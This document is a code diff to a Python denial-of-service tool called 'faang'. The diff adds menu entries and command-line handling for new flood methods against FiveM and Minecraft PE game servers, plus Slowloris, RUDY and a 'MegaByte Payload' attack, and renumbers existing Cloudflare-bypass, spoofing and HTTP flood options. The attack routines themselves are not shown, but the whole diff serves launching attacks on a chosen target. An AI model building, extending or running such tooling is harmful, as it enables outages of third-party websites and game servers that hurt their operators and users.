@@ -170,35 +170,51 @@ def start():
         StartTitle(f"Layer4 {Back.MAGENTA}TCP{Back.RESET}")
         DdosTCP()
     elif indexSelect.upper() == "3":
+        StartTitle(f"Layer4 {Back.MAGENTA}Fivem Server{Back.RESET}")
+        DdosFIVEM()
+    elif indexSelect.upper() == "4":
+        StartTitle(f"Layer4 {Back.MAGENTA}Minecraft PE Server{Back.RESET}")
+        DdosMCPE() 
+        
+    elif indexSelect.upper() == "5":
         StartTitle(f"Request GET DDoS")
         DdosGET()
-    elif indexSelect.upper() == "4":
+    elif indexSelect.upper() == "6":
         StartTitle(f"Requests POST DDoS")
         DdosPOST()
-    elif indexSelect.upper() == "5":
+    elif indexSelect.upper() == "7":
         StartTitle(f"Socket Ddos")
         DdosSOC()
-    elif indexSelect.upper() == "6":
+    elif indexSelect.upper() == "8":
         StartTitle(f"HTTP 2.0 Spoof")
         DdosSOC()
-    elif indexSelect.upper() == "7":
+    elif indexSelect.upper() == "9":
         StartTitle(f"HTTP Spoof Socket")
         DdosSPOOF()
-    elif indexSelect.upper() == "8":
+    elif indexSelect.upper() == "10":
         StartTitle(f"Head Request")
         DdosHEAD()
-    elif indexSelect.upper() == "9":
+    elif indexSelect.upper() == "11":
         StartTitle(f"Sky Method")
         DdosSKY()
-    elif indexSelect.upper() == "10":
+    elif indexSelect.upper() == "12":
         StartTitle(f"CFRequest Bypass DDoS")
         DdosCFREQ()
-    elif indexSelect.upper() == "11":
+    elif indexSelect.upper() == "13":
         StartTitle(f"CFSocket Bypass DDoS")
         DdosCFSOC()
-    elif indexSelect.upper() == "12":
+    elif indexSelect.upper() == "14":
         StartTitle(f"CF Bypass DDoS")
         DdosCFB()
+    elif indexSelect.upper() == "15":
+        StartTitle(f"Slowloris DDoS")
+        DdosSLOW()
+    elif indexSelect.upper() == "16":
+        StartTitle(f"MegaByte Payload Attack")
+        DdosMBP()
+    elif indexSelect.upper() == "17":
+        StartTitle(f"Rudy Attack")
+        DdosRUDY()
     else:
         print(f"{Fore.RED} [*] {Fore.RESET}Invalid menu")
         time.sleep(1) 
@@ -209,7 +225,7 @@ def main():
     file_path = os.path.join(current_dir, 'resources', 'ua.txt') 
     with open(file_path, 'r') as file:
         ua = file.read().split("\n") 
-    parser = argparse.ArgumentParser(description=desc(), usage="faang [-l4] [method] [target] [thread] [proxy]\n   or: faang [-l7] [method] [target] [thread] [time]",
+    parser = argparse.ArgumentParser(description=desc(), usage="faang [-l4] [method] [target] [thread] [time]\n   or: faang [-l7] [method] [target] [thread] [time]",
                                      prog="faang")
     parser.add_argument("method", type=str, nargs='?', default="",
                         help="Ddos method, run faang to show list")
@@ -252,6 +268,16 @@ def main():
             timer.join()
         elif args.method == "tcp":
             threading.Thread(target=runsender, args=(targetIp, targetPort, args.time, args.thread,"")).start()
+            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+            timer.start()
+            timer.join()
+        elif args.method == "fivem":
+            threading.Thread(target=LaunchFIVEM, args=(targetIp, targetPort, args.thread, args.time)).start()
+            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+            timer.start()
+            timer.join()
+        elif args.method == "mcpe":
+            threading.Thread(target=LaunchMCPE, args=(targetIp, targetPort, args.thread, args.time)).start()
             timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
             timer.start()
             timer.join()
@@ -318,6 +344,21 @@ def main():
             timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
             timer.start()
             LaunchCFB(target, thread, t)
+            timer.join()
+        elif args.method == "slowloris":
+            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+            timer.start()
+            LaunchSLOW(target, thread, t)
+            timer.join()
+        elif args.method == "mbp":
+            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+            timer.start()
+            LaunchMBP(target, thread, t, 100)
+            timer.join()
+        elif args.method == "rudy":
+            timer = threading.Thread(target=Countdown, args=(time.time(), float(t)))
+            timer.start()
+            LaunchRUDY(target, thread, t)
             timer.join()
         else:
             print(f"{Fore.RED} [*] {Fore.RESET}Invalid method on layer 7")
